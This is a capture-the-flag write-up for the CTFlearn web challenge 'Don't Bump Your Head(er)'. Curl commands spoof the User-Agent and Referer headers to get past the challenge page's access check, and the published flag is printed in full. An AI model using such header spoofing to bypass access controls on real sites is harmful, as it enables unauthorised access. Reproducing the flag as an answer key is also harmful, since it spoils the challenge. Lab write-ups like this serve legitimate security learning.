# Don't Bump Your Head(er)



{{< admonition tldr "TL;DR" >}}

**Don't Bump Your Head(er)** is a web challenge from **CTFlearn**. Try to bypass my security measure on this site!  [http://165.227.106.113/header.php](http://165.227.106.113/header.php)

{{< /admonition >}}

## Description

Try to bypass my security measure on this site! 
[http://165.227.106.113/header.php](http://165.227.106.113/header.php)

---

## Technical Analysis

When a page is accessed directly through a browser, the site displays an access denial message.
From the result of page inspection (via _view-source_), a suspicious HTML comment was found:

```html
Sorry, it seems as if your user agent is not correct, in order to access this website. The one you supplied is: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
<!-- Sup3rS3cr3tAg3nt  -->
```

The comment indicates that the website validates **_User-Agent_** in the HTTP request, and the expected value is `Sup3rS3cr3tAg3nt` .

---

## Header Manipulation

1. **Changing _User-Agent_**

The first experiment was carried out by modifying the **_User-Agent_** header using `curl` :

```bash
curl -A "Sup3rS3cr3tAg3nt" http://165.227.106.113/header.php
```

Output:

```html
Sorry, it seems as if you did not just come from the site, "awesomesauce.com".
```

From this response it can be concluded that **_User-Agent_** alone is not enough. The website also validates an additional header, namely the _**Referer**_ header.

2. **Adding __Referer__**

```bash
curl -A "Sup3rS3cr3tAg3nt" -e "awesomesauce.com" http://165.227.106.113/header.php
```

Output:

```html
Here is your flag: flag{did_this_m3ss_with_y0ur_h34d}
<!-- Sup3rS3cr3tAg3nt  -->
```

---

## Flags

```flag{did_this_m3ss_with_y0ur_h34d}```


---

> Author: [spawn2pwn](https://github.com/nfl-alvis)  
> URL: https://ctf.spawn2pwn.my.id/posts/dont-bump-your-header/  

